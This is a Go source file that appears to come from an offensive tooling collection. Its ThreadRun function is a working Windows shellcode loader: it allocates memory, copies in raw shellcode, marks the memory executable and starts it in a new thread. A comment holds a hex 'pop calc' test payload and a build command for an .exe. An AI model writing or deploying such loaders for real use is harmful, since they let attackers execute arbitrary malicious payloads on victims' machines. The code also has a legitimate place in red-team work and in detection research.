package run

import (
	"fmt"
	"log"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

func ThreadRun(shellcode []byte) {
	// Pop Calc Shellcode
	// shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")

	addr, errVirtualAlloc := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}

	var oldProtect uint32
	errVirtualProtect := windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if errVirtualProtect != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	CreateThread := kernel32.NewProc("CreateThread")
	thread, _, errCreateThread := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateThread:\r\n%s", errCreateThread.Error()))
	}

	_, errWaitForSingleObject := windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
	if errWaitForSingleObject != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n:%s", errWaitForSingleObject.Error()))
	}
}

// export GOOS=windows GOARCH=amd64;go build -o goCreateThread.exe cmd/CreateThread/main.go
